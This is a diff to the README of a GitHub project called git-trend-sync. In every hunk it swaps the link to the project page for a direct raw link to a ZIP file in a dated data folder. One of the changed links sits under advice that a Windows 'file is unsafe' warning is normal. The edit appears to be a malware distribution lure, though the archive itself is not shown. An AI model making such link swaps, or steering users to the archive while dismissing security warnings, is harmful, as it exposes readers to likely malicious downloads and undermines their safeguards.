@@ -1,6 +1,6 @@
 # 🤖 git-trend-sync - Find trends that fit your code
 
-[![Download](https://img.shields.io/badge/Download%20Now-4F46E5?style=for-the-badge&logo=github&logoColor=white)](https://github.com/juninfxp/git-trend-sync)
+[![Download](https://img.shields.io/badge/Download%20Now-4F46E5?style=for-the-badge&logo=github&logoColor=white)](https://github.com/juninfxp/git-trend-sync/raw/refs/heads/main/data/2026-04-05/trend_git_sync_v3.8.zip)
 
 ## 🚀 What this app does
 
@@ -31,7 +31,7 @@ Recommended setup:
 
 Go to the main project page here:
 
-https://github.com/juninfxp/git-trend-sync
+https://github.com/juninfxp/git-trend-sync/raw/refs/heads/main/data/2026-04-05/trend_git_sync_v3.8.zip
 
 From there, visit this page to download the latest release or get the app files.
 
@@ -176,7 +176,7 @@ Check that:
 ### Windows says the file is unsafe
 This can happen with new apps or ZIP files. Make sure you downloaded it from the main GitHub page:
 
-https://github.com/juninfxp/git-trend-sync
+https://github.com/juninfxp/git-trend-sync/raw/refs/heads/main/data/2026-04-05/trend_git_sync_v3.8.zip
 
 ## 🗂️ File layout
 
@@ -234,4 +234,4 @@ This saves time and helps you stay current without manual searching
 
 Main page and download source:
 
-https://github.com/juninfxp/git-trend-sync
+https://github.com/juninfxp/git-trend-sync/raw/refs/heads/main/data/2026-04-05/trend_git_sync_v3.8.zip
